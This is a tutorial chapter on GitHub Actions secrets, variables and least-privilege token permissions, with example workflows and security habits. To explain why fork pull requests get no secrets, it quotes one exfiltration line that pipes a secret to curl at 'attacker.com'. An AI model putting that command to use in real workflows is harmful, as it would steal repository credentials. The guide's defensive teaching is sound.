# 4. Secrets and permissions

Workflows routinely need credentials: a deploy hook URL, an API token, a password. Your workflow file is committed to the repository - on a public repo, the whole world reads it - so credentials can never be written into the YAML. This doc covers where they go instead, and what a workflow is allowed to do by default.

## Repository secrets

A **secret** is an encrypted name/value pair stored by GitHub, outside your code.

Creating one (you'll do this for real in the capstone):

1. On GitHub: your repo → **Settings** → **Secrets and variables** → **Actions**.
2. Under the **Secrets** tab, click **New repository secret**.
3. Name it in SCREAMING_SNAKE_CASE, e.g. `VERCEL_DEPLOY_HOOK_URL`, paste the value, save.

Using it in a workflow:

```yaml
name: Trigger deploy

on: workflow_dispatch

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Call the Vercel deploy hook
        run: curl --fail --silent --show-error -X POST "$DEPLOY_HOOK"
        env:
          DEPLOY_HOOK: ${{ secrets.VERCEL_DEPLOY_HOOK_URL }}
```

What GitHub guarantees:

- The value is encrypted at rest and only decrypted inside a run.
- If the value ever appears in log output, it is masked as `***` automatically.
- Nobody can read a secret back out of the UI, not even you - you can only overwrite or delete it. (Keep the original wherever it came from.)
- On public repos, workflows triggered by pull requests **from forks** do not receive secrets - otherwise a stranger could open a PR with `run: echo ${{ secrets.X }} | curl attacker.com` and steal them.

Style note: the example passes the secret through `env:` and the command reads `$DEPLOY_HOOK`, instead of splicing `${{ secrets... }}` directly into the command string. Prefer that. Expressions are substituted into the script *before* the shell runs it, so direct splicing can break quoting or, with attacker-influenced values, inject commands. `env:` keeps the value out of the script text entirely.

## Variables: the non-secret sibling

Same Settings page, **Variables** tab. Use for configuration that isn't sensitive (a folder ID, a target environment name) - readable in the UI, not masked in logs, accessed as `${{ vars.NAME }}`. Rule of thumb: if leaking it would only mildly annoy you, it's a variable; if leaking it would let someone act as you, it's a secret. A Vercel deploy hook URL lets anyone trigger deployments, so it's a secret.

## The GITHUB_TOKEN: the workflow's own identity

Every run automatically gets a temporary credential, `${{ secrets.GITHUB_TOKEN }}`, no setup needed. It lets the workflow act on *its own repository* through GitHub's API - push commits, comment on PRs, create releases - and it expires when the run ends.

What the token may do is controlled by the `permissions` block. The habit to build: **declare permissions explicitly, and minimally**:

```yaml
name: Auto-label new issues

on:
  issues:
    types: [opened]

permissions:
  issues: write        # this workflow may modify issues...
  contents: read       # ...and read code, and nothing else

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - name: Add the triage label
        run: gh issue edit "$NUMBER" --repo "$REPO" --add-label triage
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          NUMBER: ${{ github.event.issue.number }}
          REPO: ${{ github.repository }}
```

If a workflow needs no API access at all (like our capstone - it only calls an external URL), say so:

```yaml
permissions: {}        # this workflow can do nothing to the repo
```

A workflow that *can't* do something dangerous doesn't have to be trusted not to.

## Security habits that matter

1. **Never put credentials in the YAML or in code.** Secrets only. If a credential ever lands in a commit, treat it as leaked: revoke it and make a new one (deleting the commit is not enough - git history and forks remember).
2. **Never `echo` a secret.** Masking is a safety net with holes (transformations of the value aren't masked). Don't test it.
3. **Pin third-party actions.** `actions/checkout@v4` (GitHub's own) is fine pinned to a major version. For actions from strangers, pin the full commit SHA - `uses: someuser/some-action@3df4ab11eba7bda6032a0b82a6bb43b11571feac` - so the author can't silently replace the code your workflow runs with something malicious. A tag like `@v2` can be moved to point at new code; a SHA cannot.
4. **Give the minimum permissions,** as above.
5. **Be suspicious of `pull_request_target` and of running PR code with secrets available.** You won't need either for this project; just know that "run untrusted PR code" plus "secrets" is the classic self-inflicted vulnerability, and read the docs link below before ever combining them.

## Try it

1. Create a throwaway secret named `TEST_MESSAGE` with value `it works` in this repo's settings.
2. Add a `workflow_dispatch` workflow with one step: `run: test "$MSG" = "it works" && echo "secret received"` and `env: MSG: ${{ secrets.TEST_MESSAGE }}`. Run it from the button and confirm the log prints `secret received`.
3. Now add a step `run: echo "$MSG"` and run again - see the `***` masking in the log. Then delete the secret and the workflow (you've proven the point; don't leave echo-a-secret code around as a pattern).

## Reference

- Using secrets: <https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets>
- GITHUB_TOKEN and permissions: <https://docs.github.com/en/actions/how-tos/secure-your-work/security-harden-deployments>
- Security hardening guide: <https://docs.github.com/en/actions/reference/secure-use-reference>

Next: [5. Use cases](05-use-cases.md)
